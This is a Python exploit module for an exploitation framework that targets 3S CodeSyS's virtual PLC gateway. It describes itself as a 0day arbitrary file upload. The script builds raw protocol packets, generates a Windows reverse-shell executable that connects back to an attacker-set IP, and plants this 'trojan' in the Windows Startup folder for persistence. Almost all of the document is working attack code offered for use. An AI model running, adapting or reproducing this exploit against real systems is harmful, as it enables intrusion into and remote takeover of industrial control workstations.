#!/usr/bin/env python

import socket
import struct
import binascii
from collections import OrderedDict
from Sploit import Sploit
from shellcodes.Shellcodes import OSShellcodes
from shellcodes.ShellUtils import Constants

INFO = {}
INFO['NAME'] = 'efs_codesys3_afu'
INFO['DESCRIPTION'] = '3S Software CodeSyS Arbitrary File Upload'
INFO['VENDOR'] = 'https://www.codesys.com/'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'http://store.codesys.com/codesys.html#Alle Versionen'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '25 Apr 2017'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """Enabled virtual PLC allows to upload arbitrary file.\
 Filepath is must be relative to "%CODESYS_PATH%/GatewayPLC/" or absolute.
Tested against CodeSyS 3.5.7 Patch 4 and 3.5.10 Patch 3 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.176'
OPTIONS['PORT'] = 1217
OPTIONS['CONNECTBACK_IP'] = '192.168.1.9'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.connectback_ip = self.args.get('CONNECTBACK_IP', OPTIONS['CONNECTBACK_IP'])
        if not self.args.get('listener'):
            self.log('[!] Please enable listener')
            self.finish(False)
        self.listener_port = self.args['listener']['PORT']
        self.filename = '/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/test.exe'

    def generate_payload(self):
        sh = OSShellcodes(Constants.OS.WINDOWS, Constants.OS_ARCH.X32, self.connectback_ip, self.listener_port)
        sh.create_shellcode(make_exe=1)
        exe = sh.get_exe_path()
        with open(exe, 'rb') as f:
            trojan = f.read()
        return trojan

    def connect(self):
        self.log('[*] Connecting to virtual device')
        data = '6b6a77b601000100493837080400000001000000'.decode('hex')
        self.sock.send(data)
        self.sock.recv(4000)
        self.sock.recv(4000)

        data = '6b6a77b6010002004938370800000000'.decode('hex')
        self.sock.send(data)
        self.sock.recv(4000)

        op = int(self.host.split('.').pop())
        data = '6b6a77b6030001004a3837085200000000000000010000'.decode('hex')
        data += chr(op)
        data += '0000000000000000000000000000000000000000000000000000000000401f000000000000000000' \
               '00000000000000000000000000000000000000000000000000000000000000000000'.decode('hex')
        try:
            self.sock.send(data)
            self.sock.recv(4000)
            data = self.sock.recv(4000)
        except:
            self.log('[-] Can\'t connect to virtual device')
            self.finish(False)
        self.id_1 = data[0]
        data = '6b6a77b603000300ef47380828000000'.decode('hex')
        data += self.id_1
        data += '0000002000000055cd0c0001000200110000001000000022848000010000008101840010020000'.decode('hex')
        self.sock.send(data)
        data = self.sock.recv(4000)
        print len(data), repr(data)
        data = self.sock.recv(4000)
        print len(data), repr(data)
        self.id_2 = data[-4:]

    def write_file(self):
        self.log('[*] Writing trojan as %s' % self.filename)

        contents = self.generate_payload()

        footer = '\x01' + struct.pack('B', len(self.filename) + 0x83) + '\x80\x00' + self.filename \
                 + '\x00' * 3 + '\x02\x88\x80\x00' + struct.pack('i', binascii.crc32(contents)) + struct.pack('i', len(contents))
        footer = '\x55\xcd\x10\x00\x08\x00\x02\x00' + self.id_2 + \
                 struct.pack('B', len(footer)) + '\x00\x00\x00' + '\x00' * 4 + footer
        footer = self.id_1 + '\x00' * 3 + struct.pack('B', len(footer)) + '\x00' * 3 + footer
        data = '\x6b\x6a\x77\xb6\x03\x00\x03\x00\xee\x21\x37\x08' + struct.pack('B',
                                                                                len(footer)) + '\x00\x00\x00' + footer
        self.sock.send(data)
        print repr(data)
        data = self.sock.recv(16)
        length = struct.unpack('I', data[-4:])[0]
        data = self.sock.recv(length)
        file_ptr = data[-8:-4]
        print repr(data)
        print

        ###############################

        footer = '\x06\x84\x80\x00' +  struct.pack('I', len(contents)) + \
                 '\x05\x90\x80\x00' + file_ptr + contents + '\x00'
        footer = '\x55\xcd\x10\x00\x08\x00\x04\x00' + self.id_2 + struct.pack('I',
                                                                              len(footer)) + '\x00'*4 + footer
        footer = self.id_1 + '\x00' * 3 + struct.pack('I', len(footer)) + footer
        data = '\x6b\x6a\x77\xb6\x03\x00\x03\x00\xee\x21\x37\x08' + struct.pack('I',
                                                                                len(footer)) + footer
        self.sock.send(data)
        print repr(data)
        data = self.sock.recv(16)
        length = struct.unpack('I', data[-4:])[0]
        data = self.sock.recv(length)
        print repr(data)
        print

        ############
        footer = '\x07\x90\x80\x00' + file_ptr + self.filename \
                 + '\x00' * 4
        footer = '\x55\xcd\x10\x00\x08\x00\x08\x00' + self.id_2 + \
                 struct.pack('B', len(footer)) + '\x00\x00\x00' + '\x00' * 4 + footer
        footer = self.id_1 + '\x00' * 3 + struct.pack('I', len(footer)) + footer
        data = '\x6b\x6a\x77\xb6\x03\x00\x03\x00\xee\x21\x37\x08' + struct.pack('I', len(footer)) + footer
        self.sock.send(data)
        print repr(data)
        data = self.sock.recv(16)
        length = struct.unpack('I', data[-4:])[0]
        data = self.sock.recv(length)
        res = data[-4:]
        if res != '\x07\x02\x00\x00':
            self.log('[-] Error while uploading trojan')
            self.finish(False)
        self.log('[+] Trojan successfully uploaded to startup directory')

    def recv_all(self, length, chunk=1024):
        data = ''
        while length:
            if length <= chunk:
                data += self.sock.recv(length)
                break
            data += self.sock.recv(chunk)
            length -= chunk
        return data

    def run(self):
        #Get options from gui
        self.args()
        self.sock = socket.socket()
        self.log('[*] Connecting to %s:%s' % (self.host, self.port))
        self.sock.connect((self.host, self.port))
        self.connect()
        self.write_file()
        self.finish(True)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()